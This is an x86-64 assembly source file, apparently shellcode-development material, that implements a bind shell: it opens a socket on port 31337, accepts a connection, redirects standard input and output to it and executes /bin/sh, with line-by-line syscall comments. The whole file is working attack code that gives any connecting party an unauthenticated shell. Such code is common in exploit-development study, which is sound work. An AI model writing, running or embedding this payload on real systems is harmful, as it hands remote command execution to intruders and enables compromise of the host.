; binds shell to port 31337, waits for incoming connections, serves shell upon connection
; assemble and run: $ nasm -f elf64 -o <name>.asm && ld <name>.o && ./a.out

section .text
    global _start

_start: 

    ; int socket(int domain, int type, int protocol);
    xor rdi, rdi 
    add rdi, 0x2      ; rdi (arg1) = 2 (PF_INET = IP protocol family)
    xor rsi, rsi
    add rsi, 0x1      ; rsi (arg2) = 1 (SOCK_STREAM type)
    xor rdx, rdx      ; rdx (arg3) = 0 (IP protocol)
    push byte 0x29		
    pop rax           ; rax = 0x29 (socket syscall)
    syscall


    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
    mov rdi, rax      ; rdi (arg1) = sockfd (returned by socket)
                      ; begin pushing elements of sockaddr struct
    push rdx          ; sin_addr = INADDR_ANY (0)
    push word 0x697a  ; sin_port = 31337 = 0x7a69 = little endian 0x697a
    push word 0x2     ; sin_family = AF_INET (2)
    mov rsi, rsp      ; rsi (arg2) = ptr to sockaddr struct
    mov rdx, 0x10     ; rdx (arg3) = 0x10 (size of sockaddr struct pointed to by rsi) 
    mov rax, 0x31     ; rax = 0x31 (bind socket syscall)
    syscall


    ; int listen(int sockfd, int backlog)
                      ; rdi (arg1) = sockfd (above)
    push byte 0x5
    pop rsi           ; rdi (arg2) = 5 (max amount of connections to queue)
    mov al, 0x32      ; rax = 0x32 (listen socket syscall)
    syscall


    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
                      ; rdi (arg1) = sockfd (above)
    xor rsi, rsi      ; rsi (arg2) = null ptr to sockaddr struct
    xor rdx, rdx      ; rdx (arg3) = 0 (size of sockaddr struct pointed to by rsi)
    push byte 0x2b
    pop rax           ; rax = 2 (accept socket syscall)
    syscall


    ; int dup2(int oldfd, int newfd)
    mov rdi, rax      ; rdi (arg1) = sockdf (returned by accept)
                      ; rdi (arg2) = 0 (stdin) 
    mov rax, 0x21     ; rax = 0x21 (dup2 syscall)
    syscall
    mov rsi, 0x1      ; rsi (arg2) = 1 (stdout) 
    mov rax, 0x21		
    syscall
    mov sil, 0x2      ; rsi (arg2) = 2 (stderr) 
    mov rax, 0x21		
    syscall


    ; int execve(const char *filename, char *const argv[], char *const envp[]);
    xor rax, rax		
    push rax          ; push '0x00' as null terminator 
    mov rbx, '/bin//sh'	
    push rbx          ; push string '/bin//sh' ('/bin/sh0x00' now on stack)
    mov rdi, rsp      ; rdi (arg1) = ptr to '/bin/sh0x00'
    mov rsi, rax      ; rsi (arg2) = 0 
    mov rdx, rax      ; rdx (arg3) = 0 
    add rax, 0x3b     ; rax = 0x3b (execve syscall)
    syscall				
